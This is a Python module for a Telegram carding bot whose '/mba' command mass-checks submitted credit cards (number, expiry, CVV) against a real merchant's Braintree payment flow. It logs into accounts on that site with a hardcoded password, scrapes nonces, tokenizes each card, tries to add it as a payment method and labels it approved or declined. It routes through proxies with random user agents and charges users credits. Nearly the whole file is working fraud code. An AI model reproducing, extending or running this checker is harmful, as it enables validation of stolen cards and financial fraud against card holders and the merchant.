
import re
import time
import base64
import random
import traceback
import aiohttp
import asyncio
from pyrogram import filters
from pyrogram.enums import ParseMode
from fake_useragent import UserAgent
from CARD3D import app
from config import OWNER_ID
from CARD3D.core.mongo import has_premium_access, get_user, update_user, LEVELS
from CARD3D.modules.proxies import proxies
from CARD3D.modules import sk_set

def extract_substring(s, start, end):
    try:
        start_index = s.index(start) + len(start)
        end_index = s.index(end, start_index)
        return s[start_index:end_index]
    except ValueError:
        return None

async def check_card_with_session(card_info, emails):
    try:
        proxy = await proxies()
        async with aiohttp.ClientSession(
            proxy=proxy, connector=aiohttp.TCPConnector(ssl=False), timeout=aiohttp.ClientTimeout(total=15)
        ) as session:
            result = await check_card(session, card_info, emails)
            return result
    except asyncio.TimeoutError:
        return f"𝗖𝗮𝗿𝗱: `{card_info}`\n𝗦𝘁𝗮𝘁𝘂𝘀: 𝐃𝐞𝐜𝐥𝐢𝐧𝐞𝐝 ❌\n𝗥𝗲𝘀𝗽𝗼𝗻𝘀𝗲: Sorry, the server took too long to respond. Please try again later."
    except Exception as e:
        error_message = f"An error occurred: {str(e)}"
        return f"𝗖𝗮𝗿𝗱: `{card_info}`\n𝗦𝘁𝗮𝘁𝘂𝘀: 𝐃𝐞𝐜𝐥𝐢𝐧𝐞𝐝 ❌\n𝗥𝗲𝘀𝗽𝗼𝗻𝘀𝗲: {error_message}"
            
    
async def check_card(session, card_info, emails):
    card = card_info.strip().split("|")
    if len(card) != 4 or not all(card):
        return "Invalid card details. Please use the format: card_number|mm|yy|cvv"

    cc, mm, yy, cvv = card
    user = UserAgent().random
    results = []

    headers_login_nonce = {
            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
            'accept-language': 'en-US,en;q=0.9',
            'cache-control': 'max-age=0',
            'priority': 'u=0, i',
            'sec-ch-ua': '"Chromium";v="130", "Google Chrome";v="130", "Not?A_Brand";v="99"',
            'sec-ch-ua-mobile': '?0',
            'sec-ch-ua-platform': '"Windows"',
            'sec-fetch-dest': 'document',
            'sec-fetch-mode': 'navigate',
            'sec-fetch-site': 'none',
            'sec-fetch-user': '?1',
            'upgrade-insecure-requests': '1',
            'user-agent': user,
        }
    try:
        async with session.get('https://digicel.net/my-account/', headers=headers_login_nonce) as response:
            login_nonce = extract_substring(await response.text(), 'woocommerce-login-nonce" value="', '"')

        if not login_nonce:
            return "Failed to retrieve login nonce."
        print("login-nonce✅", login_nonce)

        headers_login_response = {
            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
            'accept-language': 'en-US,en;q=0.9',
            'cache-control': 'max-age=0',
            'content-type': 'application/x-www-form-urlencoded',
            'origin': 'https://digicel.net',
            'priority': 'u=0, i',
            'referer': 'https://digicel.net/my-account/',
            'sec-ch-ua': '"Chromium";v="130", "Google Chrome";v="130", "Not?A_Brand";v="99"',
            'sec-ch-ua-mobile': '?0',
            'sec-ch-ua-platform': '"Windows"',
            'sec-fetch-dest': 'document',
            'sec-fetch-mode': 'navigate',
            'sec-fetch-site': 'same-origin',
            'sec-fetch-user': '?1',
            'upgrade-insecure-requests': '1',
            'user-agent': user,
        }

        mail = random.choice(emails)

        data = {
            'username': mail,
            'password': 'RAJNISHAYUSHI*1+0',
            'woocommerce-login-nonce': login_nonce,
            '_wp_http_referer': '/my-account/',
            'login': 'Log in'
        }

        async with session.post('https://digicel.net/my-account/', headers=headers_login_response, data=data) as login_response:
            if login_response.status != 200:
                print(f"Login failed for {mail} with status code {login_response.status}")
                return "Login failed."
            else:
                print(f"Login successful for {mail}")

        headers_initial = {
            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
            'accept-language': 'en-US,en;q=0.9',
            'priority': 'u=0, i',
            'referer': 'https://digicel.net/my-account/payment-methods/',
            'sec-ch-ua': '"Chromium";v="130", "Google Chrome";v="130", "Not?A_Brand";v="99"',
            'sec-ch-ua-mobile': '?0',
            'sec-ch-ua-platform': '"Windows"',
            'sec-fetch-dest': 'document',
            'sec-fetch-mode': 'navigate',
            'sec-fetch-site': 'same-origin',
            'sec-fetch-user': '?1',
            'upgrade-insecure-requests': '1',
            'user-agent': user,
        }
        async with session.get('https://digicel.net/my-account/add-payment-method/', headers=headers_initial) as response:
            response_text = await response.text()
            client_token_nonce = extract_substring(response_text, '"client_token_nonce":"','"' )
            payment_nonce = extract_substring(response_text, '<input type="hidden" id="woocommerce-add-payment-method-nonce" name="woocommerce-add-payment-method-nonce" value="','" />' )
            print("add_payment_method_nonce", payment_nonce)

        headers_token_request = {
            'accept': '*/*',
            'accept-language': 'en-US,en;q=0.9',
            'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
            'origin': 'https://digicel.net',
            'priority': 'u=1, i',
            'referer': 'https://digicel.net/my-account/add-payment-method/',
            'sec-ch-ua': '"Chromium";v="130", "Google Chrome";v="130", "Not?A_Brand";v="99"',
            'sec-ch-ua-mobile': '?0',
            'sec-ch-ua-platform': '"Windows"',
            'sec-fetch-dest': 'empty',
            'sec-fetch-mode': 'cors',
            'sec-fetch-site': 'same-origin',
            'user-agent': user,
            'x-requested-with': 'XMLHttpRequest',
        }

        data_token_request = {
            'action': 'wc_braintree_credit_card_get_client_token',
            'nonce': client_token_nonce,
        }

        async with session.post('https://digicel.net/wp-admin/admin-ajax.php', headers=headers_token_request, data=data_token_request) as response:
            response_json = await response.json()
            client_token = response_json['data']
            decoded_token = base64.b64decode(client_token).decode('utf-8')
            authorization = extract_substring(decoded_token, '"authorizationFingerprint":"', '"')
            print("authorization", authorization)

        headers_payment = {
            'accept': '*/*',
            'accept-language': 'en-US,en;q=0.9',
            'authorization': f'Bearer {authorization}',
            'braintree-version': '2018-05-10',
            'content-type': 'application/json',
            'origin': 'https://digicel.net',
            'priority': 'u=1, i',
            'referer': 'https://digicel.net/',
            'sec-ch-ua': '"Chromium";v="130", "Google Chrome";v="130", "Not?A_Brand";v="99"',
            'sec-ch-ua-mobile': '?0',
            'sec-ch-ua-platform': '"Windows"',
            'sec-fetch-dest': 'empty',
            'sec-fetch-mode': 'cors',
            'sec-fetch-site': 'cross-site',
            'user-agent': user,
        }

        json_data = {
            'clientSdkMetadata': {
                'source': 'client',
                'integration': 'custom',
                'sessionId': '06dcde69-e90a-43f9-82ec-12eaf13f09b2',
            },
            'query': 'mutation TokenizeCreditCard($input: TokenizeCreditCardInput!) { tokenizeCreditCard(input: $input) { token creditCard { bin brandCode last4 cardholderName expirationMonth expirationYear binData { prepaid healthcare debit durbinRegulated commercial payroll issuingBank countryOfIssuance productId } } } }',
            'variables': {
                'input': {
                    'creditCard': {
                        'number': cc,
                        'expirationMonth': mm,
                        'expirationYear': yy,
                        'cvv': cvv,
                    },
                    'options': {
                        'validate': False,
                    },
                },
            },
            'operationName': 'TokenizeCreditCard',
        }

        async with session.post('https://payments.braintree-api.com/graphql', headers=headers_payment, json=json_data) as response:
            response_json = await response.json()
            token = response_json['data']['tokenizeCreditCard']['token']
            print("token✅", token)


        headers_final = {
            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
            'accept-language': 'en-US,en;q=0.9',
            'cache-control': 'max-age=0',
            'content-type': 'application/x-www-form-urlencoded',
            'origin': 'https://digicel.net',
            'priority': 'u=0, i',
            'referer': 'https://digicel.net/my-account/add-payment-method/',
            'sec-ch-ua': '"Chromium";v="130", "Google Chrome";v="130", "Not?A_Brand";v="99"',
            'sec-ch-ua-mobile': '?0',
            'sec-ch-ua-platform': '"Windows"',
            'sec-fetch-dest': 'document',
            'sec-fetch-mode': 'navigate',
            'sec-fetch-site': 'same-origin',
            'sec-fetch-user': '?1',
            'upgrade-insecure-requests': '1',
            'user-agent': user,
        }
        data = {
            'payment_method': 'braintree_credit_card',
            'wc-braintree-credit-card-card-type': 'visa',
            'wc-braintree-credit-card-3d-secure-enabled': '',
            'wc-braintree-credit-card-3d-secure-verified': '',
            'wc-braintree-credit-card-3d-secure-order-total': '0.00',
            'wc_braintree_credit_card_payment_nonce': token,
            'wc_braintree_device_data': '{"correlation_id":"ba0a0b209c4c796a105076f720610b56"}',
            'wc-braintree-credit-card-tokenize-payment-method': 'true',
            'woocommerce-add-payment-method-nonce': payment_nonce,
            '_wp_http_referer': '/my-account/add-payment-method/',
            'woocommerce_add_payment_method': '1',
        }

        async with session.post('https://digicel.net/my-account/add-payment-method/', headers=headers_final, data=data) as response:
            text = await response.text()

        r1 = extract_substring(text, '<div class="wc-block-components-notice-banner__content">', '</div>')

        def clean_response(response_text):
            if response_text:
                response_text = response_text.replace("Status code", "").strip()
                response_text = ' '.join(response_text.split())
            return response_text or ""

        final_response = clean_response(r1).lower()

        if not final_response:
            print("No response found or response could not be parsed.")
            final_response = "No response received."

        approval_keywords = ['payment method added', 'Invalid postal code or street address.', 'you cannot add a new payment method so soon after the previous one. please wait for 20 seconds.', 'duplicate']

        if any(keyword in final_response for keyword in approval_keywords):
            status = "𝗔𝗽𝗽𝗿𝗼𝘃𝗲𝗱✅"
            final_response = "1000: Approved"

        elif 'risk_threshold' in final_response:
            status = "𝐃𝐞𝐜𝐥𝐢𝐧𝐞𝐝 ❌"
            final_response = "RISK: Retry this BIN later."

        else:
            status = "𝐃𝐞𝐜𝐥𝐢𝐧𝐞𝐝 ❌"

        results.append(
        f"𝗖𝗮𝗿𝗱: `{cc}|{mm}|{yy}|{cvv}`\n"
        f"𝗦𝘁𝗮𝘁𝘂𝘀: {status}\n"
        f"𝗥𝗲𝘀𝗽𝗼𝗻𝘀𝗲: {final_response}\n")

        return "\n".join(results)

    except Exception as e:
        traceback.print_exc()
        return f"An error occurred: {e}"

card_pattern = re.compile(r"(\d{15,16})[|/:](\d{2})[|/:](\d{2,4})[|/:](\d{3,4})")


@app.on_message(filters.command("mba", prefixes=[".", "/", "!"]))
async def handle_check_card(client, message):
    user_id = message.from_user.id
    chat_id = message.chat.id

    has_access, access_msg, user_plan = await has_premium_access(
        user_id, chat_id, required_credits=0
    )
    if not has_access:
        await message.reply_text(access_msg, parse_mode=ParseMode.MARKDOWN)
        return

    user = await get_user(user_id)
    if not user:
        await message.reply_text(
            "❌ **You are not registered. Please use /register first.**",
            parse_mode=ParseMode.MARKDOWN,
        )
        return

    user_plan = user.get("plan", "Free")
    user_credits = user.get("credits", 0)
    user_plan_symbol = LEVELS.get(user_plan, {}).get("symbol", "")

    if user_id == OWNER_ID:
        user_plan = "STRIPEHIT"
        user_plan_symbol = LEVELS["STRIPEHIT"]["symbol"]
        user_credits = -1

    if not sk_set.email_list:
        await message.reply("Secret keys are not set. Report to the owner.")
        return

    emails = sk_set.email_list

    card_info_text = None
    if message.reply_to_message:
        card_matches = re.findall(card_pattern, message.reply_to_message.text)
        if card_matches:
            card_info_text = "\n".join(["|".join(match) for match in card_matches])
    else:
        try:
            card_info_text = message.text.split(maxsplit=1)[1].strip()
        except IndexError:
            await message.reply(
                "Please provide multiple card details, each on a new line in the format: `card_number|mm|yy|cvv`"
            )
            return

    if not card_info_text:
        await message.reply("No valid card details found. Please provide valid card details.")
        return

    cards_info = card_info_text.split("\n")[:30]
    invalid_cards = [card for card in cards_info if not card_pattern.fullmatch(card.strip())]
    if invalid_cards:
        await message.reply(f"Invalid card formats: {', '.join(invalid_cards)}. Use format: `card_number|mm|yy|cvv`.")
        return

    if user_id != OWNER_ID and user_credits < 10 * len(cards_info):
        await message.reply("❌ You do not have enough credits to process these cards.")
        return

    start_time = time.time()
    processing_msg = await message.reply("Processing your request...")

    final_responses = []
    for idx, card_info in enumerate(cards_info):
        response = await check_card_with_session(card_info.strip(), emails)
        final_responses.append(response)
        await asyncio.sleep(5)

    max_display = 20
    if len(final_responses) > max_display:
        final_response = "\n".join(final_responses[:max_display]) + f"\n...and {len(final_responses) - max_display} more."
    else:
        final_response = "\n".join(final_responses)

    elapsed_time = round(time.time() - start_time, 2)
    await processing_msg.edit_text(
        text=f"𝗠𝗮𝘀𝘀 𝗕𝗿𝗮𝗶𝗻𝘁𝗿𝗲𝗲 𝗔𝘂𝘁𝗵\n\n{final_response}\n"
             f"𝗧𝗶𝗺𝗲: {elapsed_time} seconds\n"
             f"𝗖𝗵𝗲𝗰𝗸𝗲𝗱 𝗕𝘆: [{message.from_user.first_name}](tg://user?id={user_id})⤿ {user_plan} {user_plan_symbol} ⤾\n"
    )

    if user_id != OWNER_ID:
        new_credits = user_credits - (10 * len(cards_info))
        await update_user(user_id, {"credits": max(new_credits, 0)})
